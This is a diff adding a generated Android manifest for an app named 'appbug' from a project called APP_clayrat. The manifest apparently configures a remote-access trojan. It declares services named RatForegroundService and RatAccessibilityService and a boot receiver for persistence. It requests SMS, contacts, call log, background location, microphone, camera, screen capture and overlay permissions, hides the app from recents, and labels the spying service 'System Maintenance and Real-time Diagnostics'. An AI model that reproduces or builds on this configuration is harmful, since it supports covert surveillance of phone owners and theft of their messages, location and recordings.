@@ -1,0 +1,275 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.mzkyzak.appbug"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="24"
+9        android:targetSdkVersion="34" />
+10
+11    <uses-permission android:name="android.permission.INTERNET" />
+11-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:5:5-67
+11-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:5:22-64
+12    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+12-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:6:5-81
+12-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:6:22-78
+13    <uses-permission android:name="android.permission.WAKE_LOCK" />
+13-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:7:5-68
+13-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:7:22-65
+14    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+14-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:8:5-77
+14-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:8:22-74
+15    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+15-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:9:5-89
+15-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:9:22-86
+16    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+16-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:10:5-86
+16-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:10:22-83
+17    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+17-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:11:5-88
+17-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:11:22-85
+18    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+18-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:12:5-94
+18-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:12:22-91
+19    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+19-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:13:5-84
+19-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:13:22-81
+20
+21    <!-- FIX: Ijin Overlay & Notif -->
+22    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+22-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:16:5-78
+22-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:16:22-75
+23    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+23-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:17:5-77
+23-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:17:22-74
+24    <uses-permission android:name="android.permission.READ_SMS" />
+24-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:19:5-67
+24-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:19:22-64
+25    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+25-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:20:5-70
+25-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:20:22-67
+26    <uses-permission android:name="android.permission.READ_CONTACTS" />
+26-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:21:5-72
+26-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:21:22-69
+27    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+27-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:22:5-72
+27-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:22:22-69
+28    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+28-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:23:5-79
+28-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:23:22-76
+29    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+29-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:24:5-81
+29-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:24:22-78
+30    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+30-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:25:5-85
+30-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:25:22-82
+31    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+31-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:26:5-71
+31-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:26:22-68
+32    <uses-permission android:name="android.permission.CAMERA" />
+32-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:27:5-65
+32-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:27:22-62
+33    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+33-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:28:5-77
+33-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:28:22-74
+34    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+34-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:29:5-95
+34-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:29:22-92
+35
+36    <uses-feature
+36-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:31:5-85
+37        android:name="android.hardware.camera"
+37-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:31:19-57
+38        android:required="false" />
+38-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:31:58-82
+39
+40    <permission
+40-->[androidx.core:core:1.12.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\6d18b477bc13eedb923ad8ccd1de647d\transformed\core-1.12.0\AndroidManifest.xml:22:5-24:47
+41        android:name="com.mzkyzak.appbug.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+41-->[androidx.core:core:1.12.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\6d18b477bc13eedb923ad8ccd1de647d\transformed\core-1.12.0\AndroidManifest.xml:23:9-81
+42        android:protectionLevel="signature" />
+42-->[androidx.core:core:1.12.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\6d18b477bc13eedb923ad8ccd1de647d\transformed\core-1.12.0\AndroidManifest.xml:24:9-44
+43
+44    <uses-permission android:name="com.mzkyzak.appbug.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+44-->[androidx.core:core:1.12.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\6d18b477bc13eedb923ad8ccd1de647d\transformed\core-1.12.0\AndroidManifest.xml:26:5-97
+44-->[androidx.core:core:1.12.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\6d18b477bc13eedb923ad8ccd1de647d\transformed\core-1.12.0\AndroidManifest.xml:26:22-94
+45
+46    <application
+46-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:33:5-80:19
+47        android:allowBackup="true"
+47-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:34:9-35
+48        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+48-->[androidx.core:core:1.12.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\6d18b477bc13eedb923ad8ccd1de647d\transformed\core-1.12.0\AndroidManifest.xml:28:18-86
+49        android:debuggable="true"
+50        android:extractNativeLibs="false"
+51        android:label="@string/app_name"
+51-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:35:9-41
+52        android:supportsRtl="true"
+52-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:36:9-35
+53        android:testOnly="true"
+54        android:theme="@style/Theme.AppBug" >
+54-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:37:9-44
+55        <activity
+55-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:40:9-49:20
+56            android:name="com.mzkyzak.appbug.MainActivity"
+56-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:41:13-41
+57            android:excludeFromRecents="true"
+57-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:43:13-46
+58            android:exported="true"
+58-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:42:13-36
+59            android:launchMode="singleInstance" >
+59-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:44:13-48
+60            <intent-filter>
+60-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:45:13-48:29
+61                <action android:name="android.intent.action.MAIN" />
+61-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:46:17-69
+61-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:46:25-66
+62
+63                <category android:name="android.intent.category.LAUNCHER" />
+63-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:47:17-77
+63-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:47:27-74
+64            </intent-filter>
+65        </activity>
+66
+67        <service
+67-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:51:9-58:19
+68            android:name="com.mzkyzak.appbug.RatForegroundService"
+68-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:52:13-49
+69            android:enabled="true"
+69-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:53:13-35
+70            android:exported="false"
+70-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:54:13-37
+71            android:foregroundServiceType="specialUse|location|microphone|mediaProjection|camera" >
+71-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:55:13-98
+72            <property
+72-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:56:13-57:80
+73                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+73-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:56:23-82
+74                android:value="System Maintenance and Real-time Diagnostics" />
+74-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:57:17-77
+75        </service>
+76        <service
+76-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:60:9-70:19
+77            android:name="com.mzkyzak.appbug.RatAccessibilityService"
+77-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:61:13-52
+78            android:exported="false"
+78-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:63:13-37
+79            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+79-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:62:13-79
+80            <intent-filter>
+80-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:64:13-66:29
+81                <action android:name="android.accessibilityservice.AccessibilityService" />
+81-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:65:17-92
+81-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:65:25-89
+82            </intent-filter>
+83
+84            <meta-data
+84-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:67:13-69:72
+85                android:name="android.accessibilityservice"
+85-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:68:17-60
+86                android:resource="@xml/accessibility_service_config" />
+86-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:69:17-69
+87        </service>
+88
+89        <receiver
+89-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:72:9-78:20
+90            android:name="com.mzkyzak.appbug.BootReceiver"
+90-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:72:19-47
+91            android:exported="true" >
+91-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:73:13-36
+92            <intent-filter>
+92-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:74:13-77:29
+93                <action android:name="android.intent.action.BOOT_COMPLETED" />
+93-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:75:17-79
+93-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:75:25-76
+94                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+94-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:76:17-82
+94-->C:\Users\USER\Documents\APP_clayrat\app\src\main\AndroidManifest.xml:76:25-79
+95            </intent-filter>
+96        </receiver>
+97
+98        <provider
+98-->[androidx.emoji2:emoji2:1.2.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\0a37c5087236bde304f58a22bb4f82cf\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:24:9-32:20
+99            android:name="androidx.startup.InitializationProvider"
+99-->[androidx.emoji2:emoji2:1.2.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\0a37c5087236bde304f58a22bb4f82cf\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:25:13-67
+100            android:authorities="com.mzkyzak.appbug.androidx-startup"
+100-->[androidx.emoji2:emoji2:1.2.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\0a37c5087236bde304f58a22bb4f82cf\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:26:13-68
+101            android:exported="false" >
+101-->[androidx.emoji2:emoji2:1.2.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\0a37c5087236bde304f58a22bb4f82cf\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:27:13-37
+102            <meta-data
+102-->[androidx.emoji2:emoji2:1.2.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\0a37c5087236bde304f58a22bb4f82cf\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:29:13-31:52
+103                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+103-->[androidx.emoji2:emoji2:1.2.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\0a37c5087236bde304f58a22bb4f82cf\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:30:17-75
+104                android:value="androidx.startup" />
+104-->[androidx.emoji2:emoji2:1.2.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\0a37c5087236bde304f58a22bb4f82cf\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:31:17-49
+105            <meta-data
+105-->[androidx.lifecycle:lifecycle-process:2.6.1] C:\Users\USER\.gradle\caches\9.7.0\transforms\9b77c8ce9d1f6b8bb77216af3872303f\transformed\jetified-lifecycle-process-2.6.1\AndroidManifest.xml:29:13-31:52
+106                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+106-->[androidx.lifecycle:lifecycle-process:2.6.1] C:\Users\USER\.gradle\caches\9.7.0\transforms\9b77c8ce9d1f6b8bb77216af3872303f\transformed\jetified-lifecycle-process-2.6.1\AndroidManifest.xml:30:17-78
+107                android:value="androidx.startup" />
+107-->[androidx.lifecycle:lifecycle-process:2.6.1] C:\Users\USER\.gradle\caches\9.7.0\transforms\9b77c8ce9d1f6b8bb77216af3872303f\transformed\jetified-lifecycle-process-2.6.1\AndroidManifest.xml:31:17-49
+108            <meta-data
+108-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:29:13-31:52
+109                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
+109-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:30:17-85
+110                android:value="androidx.startup" />
+110-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:31:17-49
+111        </provider>
+112
+113        <activity
+113-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\5aec47aecda57418c962e052ca48b54c\transformed\jetified-play-services-base-18.1.0\AndroidManifest.xml:20:9-22:45
+114            android:name="com.google.android.gms.common.api.GoogleApiActivity"
+114-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\5aec47aecda57418c962e052ca48b54c\transformed\jetified-play-services-base-18.1.0\AndroidManifest.xml:20:19-85
+115            android:exported="false"
+115-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\5aec47aecda57418c962e052ca48b54c\transformed\jetified-play-services-base-18.1.0\AndroidManifest.xml:22:19-43
+116            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+116-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\5aec47aecda57418c962e052ca48b54c\transformed\jetified-play-services-base-18.1.0\AndroidManifest.xml:21:19-78
+117
+118        <meta-data
+118-->[com.google.android.gms:play-services-basement:18.1.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\7cd97b81d7b363291ab7da6b43c4acfc\transformed\jetified-play-services-basement-18.1.0\AndroidManifest.xml:21:9-23:69
+119            android:name="com.google.android.gms.version"
+119-->[com.google.android.gms:play-services-basement:18.1.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\7cd97b81d7b363291ab7da6b43c4acfc\transformed\jetified-play-services-basement-18.1.0\AndroidManifest.xml:22:13-58
+120            android:value="@integer/google_play_services_version" />
+120-->[com.google.android.gms:play-services-basement:18.1.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\7cd97b81d7b363291ab7da6b43c4acfc\transformed\jetified-play-services-basement-18.1.0\AndroidManifest.xml:23:13-66
+121
+122        <receiver
+122-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:34:9-52:20
+123            android:name="androidx.profileinstaller.ProfileInstallReceiver"
+123-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:35:13-76
+124            android:directBootAware="false"
+124-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:36:13-44
+125            android:enabled="true"
+125-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:37:13-35
+126            android:exported="true"
+126-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:38:13-36
+127            android:permission="android.permission.DUMP" >
+127-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:39:13-57
+128            <intent-filter>
+128-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:40:13-42:29
+129                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
+129-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:41:17-91
+129-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:41:25-88
+130            </intent-filter>
+131            <intent-filter>
+131-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:43:13-45:29
+132                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
+132-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:44:17-85
+132-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:44:25-82
+133            </intent-filter>
+134            <intent-filter>
+134-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:46:13-48:29
+135                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
+135-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:47:17-88
+135-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:47:25-85
+136            </intent-filter>
+137            <intent-filter>
+137-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:49:13-51:29
+138                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
+138-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:50:17-95
+138-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\USER\.gradle\caches\9.7.0\transforms\43f322e5436f6455bb90fa291d7202e6\transformed\jetified-profileinstaller-1.3.0\AndroidManifest.xml:50:25-92
+139            </intent-filter>
+140        </receiver>
+141    </application>
+142
+143</manifest>
